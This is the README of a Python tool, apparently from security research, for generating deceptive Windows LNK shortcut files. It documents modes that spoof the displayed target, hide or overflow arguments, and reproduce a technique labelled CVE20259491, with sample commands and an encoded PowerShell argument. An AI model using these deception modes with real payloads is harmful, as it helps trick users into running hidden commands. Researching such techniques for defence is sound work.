# lnk-generator

A `python` module for generating deceptive LNK files.

Read more about this tool in the blog post [_Trust Me, I'm A Shortcut_](https://www.wietzebeukema.nl/blog/trust-me-im-a-shortcut).

## Installation

0. Make sure you have a recent version of `python` installed; version 3.10.0 or higher is required.
1. Download or clone the repository.
2. Open your favourite command shell and navigate to the repository's main folder.
3. Run `python3 -m lnk-generator.generate --help` to see the module's manual.

## Examples

| Example | Screenshot | Command |
| ------- | ---------- | ------- |
| `SPOOFEXE_SHOWARGS_ENABLETARGET`<br>🟢 Spoofed target EXE<br>🔴 Arguments visible | <img src="/docs/SPOOFEXE_SHOWARGS_ENABLETARGET.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --fake-path "TrustedExecutable.exe" --target-executable "c:\windows\system32\calc.exe" SPOOFEXE_SHOWARGS_ENABLETARGET` |
| `REALEXE_HIDEARGS_DISABLETARGET`<br>🟢 Arguments invisible<br>🔴 Shows real target EXE<br>🔵 Target field disabled| <img src="/docs/REALEXE_HIDEARGS_DISABLETARGET.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --target-executable "c:\windows\system32\conhost.exe" --target-command-line "cmd.exe /c ping 127.0.0.1" REALEXE_HIDEARGS_DISABLETARGET` |
| `CVE20259491`<br>🟢 Arguments invisible<br>🔴 Shows real target EXE<br>🔴 Detected by Windows Defender | <img src="/docs/CVE20259491.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --target-executable "%COMSPEC%" --target-command-line "/c calc.exe" CVE20259491` |
| `SPOOFEXE_OVERFLOWARGS_DISABLETARGET`<br>🟢 Spoofed target EXE<br>🟢 Arguments invisible<br>🔴 Requires Win 11 23H2 or earlier, requires double double-clicking to open<br>🔵 Target field disabled<br>🔵 Updates to true path after opening| <img src="/docs/SPOOFEXE_OVERFLOWARGS_DISABLETARGET.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --fake-path "C:\README.txt" --target-executable "c:\windows\system32\cmd.exe" --target-command-line "/c ping 127.0.0.1" --icon "%WINDIR%\System32\imageres.dll" --icon-index=97 SPOOFEXE_OVERFLOWARGS_DISABLETARGET` |
| `SPOOFEXE_HIDEARGS_DISABLETARGET`<br>🟢 Spoofed target EXE<br>🟢 Arguments invisible<br>🔵 Target field disabled<br>🔵 Updates to true path after opening | <img src="/docs/SPOOFEXE_HIDEARGS_DISABLETARGET.jpg" alt="Screenshot" width="250" /> | `python3 -m lnk-generator.generate --fake-path "F:\USB Drive" --target-executable "%WINDIR%\System32\WindowsPowershell\v1.0\powershell.exe" --target-command-line "/ec ZQBjAGgAbwAgACIASABpACAAZgByAG8AbQAgAEAAVwBpAGUAdAB6AGUAIgA7ACAAcgBlAGEAZAAtAGgAbwBzAHQA" --icon "%WINDIR%\System32\shell32.dll" --icon-index=7 SPOOFEXE_HIDEARGS_DISABLETARGET` |

## Usage

```text
usage: generate.py [-h] --target-executable c:\path\to\file.exe [--target-command-line "/some /arguments"] [--fake-path c:\path\to\fake_file.exe] [--working-dir c:\path\to\working\dir]
                   [--icon c:\path\to\icon.ico] [--icon-index n] [--output path/to/shortcut.lnk]
                   {SPOOFEXE_SHOWARGS_ENABLETARGET,REALEXE_HIDEARGS_DISABLETARGET,SPOOFEXE_OVERFLOWARGS_DISABLETARGET,SPOOFEXE_HIDEARGS_DISABLETARGET,CVE20259491}

Generate a deceptive LNK file. (C) @Wietze, 2025

positional arguments:
  {SPOOFEXE_SHOWARGS_ENABLETARGET,REALEXE_HIDEARGS_DISABLETARGET,SPOOFEXE_OVERFLOWARGS_DISABLETARGET,SPOOFEXE_HIDEARGS_DISABLETARGET,CVE20259491}
                        SPOOFEXE_SHOWARGS_ENABLETARGET          Spoof the target executable (command-line arguments will remain visible, target field will be enabled)
                        REALEXE_HIDEARGS_DISABLETARGET          Disable the entire target field, only show target executable (command-line arguments are invisible)
                        SPOOFEXE_OVERFLOWARGS_DISABLETARGET     Spoof the target executable (command-line arguments will be visually hidden, target field will be disabled) - no longer works on Windows 11 24H2 and higher
                        SPOOFEXE_HIDEARGS_DISABLETARGET         Spoof the target executable (command-line arguments will be fully hidden, target field will be disabled)
                        CVE20259491                             Only show target executable (command-line arguments are invisible)

options:
  -h, --help            show this help message and exit
  --output path/to/shortcut.lnk
                        The output path of the LNK on this system.

LNK target:
  --target-executable c:\path\to\file.exe
                        The path of the executable that should be executed.
  --target-command-line "/some /arguments"
                        Any command-line arguments for the target executable.
  --fake-path c:\path\to\fake_file.exe
                        A spoofed path that will be displayed in the LNK's target field.
  --working-dir c:\path\to\working\dir
                        The working directory to set for the LNK file. Supported for 
                        SPOOFEXE_HIDEARGS_DISABLETARGET, REALEXE_HIDEARGS_DISABLETARGET and
                        SPOOFEXE_OVERFLOWARGS_DISABLETARGET. Not supported for
                        SPOOFEXE_SHOWARGS_ENABLETARGET and CVE20259491 (a warning will be emitted).

LNK icon:
  --icon c:\path\to\icon.ico
                        A path to a .ico file that will be used as the LNK file's icon. Supports environment variables.
  --icon-index n        The index within the specified icon file that holds the icon the LNK file should display.
```
